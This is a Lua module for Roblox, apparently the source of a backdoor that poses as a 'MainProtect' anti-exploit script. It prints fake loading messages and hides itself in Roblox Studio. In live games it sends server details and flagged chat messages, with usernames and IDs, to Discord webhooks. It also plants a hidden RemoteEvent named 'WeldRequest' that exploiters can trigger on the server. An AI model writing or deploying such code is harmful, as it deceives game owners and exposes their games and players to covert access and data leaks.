-- The code used here is cleaned up compared to the original code

local module = {}
function module.hail()

	-- Declare some variables first --
	-- List of words to watch for in the chat
	local wordstowatch = {"blacklistedwordhere", "anotherblacklistedwordhere"}

	-- Webhook links
	-- You can try use this webhook proxy for sending webhooks from Roblox to Discord, as Discord has blocked Roblox's requests : https://hooks.hyra.io/
	-- Webhook URL for games under 10 people
	local b = ""

	-- Webhook URL for games at or above 10 people
	local d = ""

	-- Webhook URL for sending chat logs when a blacklisted word is sent
	local e = ""

	-- Setup webhook embeds --
    -- Variabls for the webhook embed
	local plrcount = #game.Players:GetPlayers()
	local players = game.Players:GetPlayers()
	local creatorname = game.Players:GetNameFromUserIdAsync(game.CreatorId)
	local id = game.PlaceId
	local GetName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)

	-- Setup the actual embeds
	local http = game:GetService("HttpService")

	-- For servers that have less than 10 people
	local data_belowplr10 = {
		["content"] = " ", -- There must be a spacebar character here, the content cannot be empty or it will not send
		["embeds"] = {
			{
				-- Play around with the embeds and see what fits you the most
				["title"] = "**Main embed title**",
				["description"] = "Generic description",
				["type"] = "rich",
				["color"] = tonumber(0xaa1cf3), -- ignore the 0x, aa1cf3 is a hex code
				["thumbnail"] = {
					["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId=" ..
						id .. "&width=768&height=432"
				},
				["fields"] = {
					{
						["name"] = "**Game info**",
						["value"] = "**Name : **" .. GetName.Name ..
							"\n**Server Players : **" .. -- \n is for newline
							plrcount ..
							"/" ..
							game.Players.MaxPlayers ..
							"\n**Game Creator : **" .. creatorname .. "",
						["inline"] = false
					},
					{
						["name"] = "**Game link**",
						["value"] = "[Click here](https://www.roblox.com/games/" ..
							game.PlaceId .. ") for the game link.",
						["inline"] = false
					},
					{
						["name"] = "Additional field here",
						["value"] = "Field content",
						["inline"] = false
					}
				}
			}
		}
	}

	-- For servers that have 10 or more players
	local data_plr10 = {
		["content"] = " ",  -- There must be a spacebar character here, the content cannot be empty or it will not send
		["embeds"] = {
			{
				-- Play around with the embeds and see what fits you the most
				["title"] = "**Main embed title** | +10 player games",
				["description"] = "Probably something here about not abusing these high player games",
				["type"] = "rich",
				["color"] = tonumber(0xaa1cf3), -- ignore the 0x, aa1cf3 is a hex code
				["thumbnail"] = {
					["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId=" ..
						id .. "&width=768&height=432"
				},
				["fields"] = {
					{
						["name"] = "**Game info**",
						["value"] = "**Name : **" ..
							GetName.Name ..
							"\n**Server Players : **" .. -- \n is for newline
							plrcount ..
							"/" ..
							game.Players.MaxPlayers ..
							"\n**Game Creator : **" .. creatorname .. "",
						["inline"] = false
					},
					{
						["name"] = "**Game link**",
						["value"] = "[Click here](https://www.roblox.com/games/" ..
							game.PlaceId .. ") for the game link.",
						["inline"] = false
					},
					{
						["name"] = "Additional field here",
						["value"] = "Field content",
						["inline"] = false
					}
				}
			}
		}
	}
	
	-- Now we encode it
	local Data = http:JSONEncode(data_belowplr10)
	local Data_PLR10 = http:JSONEncode(data_plr10)

	-- Actual code --
	-- Although this won't help too much, we can always check whether we are running in Roblox Studio or not
	local run = game:GetService("RunService")
	if run:IsStudio() then
		print("MainProtect | Running in Roblox Studio")
		script:Destroy() -- Honestly kinda useless now
	else
		-- Now that we realised that it's the actual game, we can start
		-- Here are just some examples of fake messages you can try and attempt using
		print("===== MainProtect V2.X =====")
		print("[MainProtect] Getting core scripts...")
		print("[MainProtect] Running core scripts 1/4...")

		-- Check if HTTP requests are enabled or not
		local CheckHttp = function()
			local Set = false
			pcall(
				function()
					if http:GetAsync("https://www.google.com/") then
						Set = not Set
					end
				end
			)
			return Set
		end

		-- More fake messages
		print("[MainProtect] Running core scripts 2/4...")
		
		-- Gives the GUI to the player
		-- We want to give it to the player first before we check if HTTP is enabled
		game.Players.PlayerAdded:Connect(
			function(player)
				-- Give to player
				print("[MainProtect] New player joined, name added to playerlist.")
				if player:IsInGroup(0000000) then -- Replace 0000000 with your group ID
					--[[
						Here, you can run code
						For example, you can load a modulescript with a GUI using
						require(0000000).load(player.Name) -- Replace 0000000 with your module ID
					]]
				end

				print("[MainProtect] New player joined, name added to playerlist.") -- Fake messages
				plrcount = #game.Players:GetPlayers() -- Update the player count.

				-- Send log
				if CheckHttp() then -- If there is indeed HTTP requests enabled
                    player.Chatted:Connect(function(msg)
						for i,v in ipairs(wordstowatch) do
							if string.find(msg, v) then
								local data_cht =  -- For CHT
									{
										["content"] = " ",
										["embeds"] = {
											{
												["title"] = "**Main's Word Check**",
												["description"] = "This is a security measure to catch out people trying to expose stuff",
												["type"] = "rich", 
												["color"] = tonumber(0xaa1cf3),
												["thumbnail"] = {
													["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId="..id.."&width=768&height=432",
												},
												["fields"] = {
													{
														["name"] = "**User info**",
														["value"] = "**Username : **"..player.Name.."\n**User ID : **"..player.UserId.. "",
														["inline"] = false
													},
													{
														["name"] = "**Message sent by user**",
														["value"] = "`" ..msg.. "`",
														["inline"] = false	
													}

												}
											}
										}
									}
								local DataCHT = http:JSONEncode(data_cht)
								http:PostAsync(e, DataCHT) -- Main's CHT
							end
						end	
					end)

					if plrcount > 10 then
						http:PostAsync(b, Data_PLR10) -- Main's +10
					else
						-- http:PostAsync(c, Data) -- Main's 2020 Ver
						http:PostAsync(d, Data) -- Main's SS Server
					end

				else -- If HTTP requests are not enabled, we can annoy the game owner into doing so
					-- There are better ways than using hints, but this works regardless
					local h = Instance.new("Hint")
					h.Parent = game.Workspace
					h.Text = "Anti Exploit : Please allow HTTP Requests in Game Settings > Security!"
				end
			end
		)

		print("[MainProtect] Running core scripts 3/4...")

		-- This is another thing I added during the start of MainDab
		-- Players using an exploit can use thsi remoteevent to run stuff, all they have to do is to call it
		local Remote = Instance.new("RemoteEvent", game.JointsService)
		Remote.Name = "WeldRequest"
		Remote.OnServerEvent:Connect(
			function(plr, key)
				if key == "gui" then
					--[[
						Here, you can run code
						For example, you can load a modulescript with a GUI using
						require(0000000).load(player.Name) -- Replace 0000000 with your module ID
					]]
				end
			end
		)
		
		-- More fake messages
		print("[MainProtect] Running core scripts 4/4...")
		print("[MainProtect] Final load 1/1...")
		print("[MainProtect] Fully loaded!")
	end
end
return module
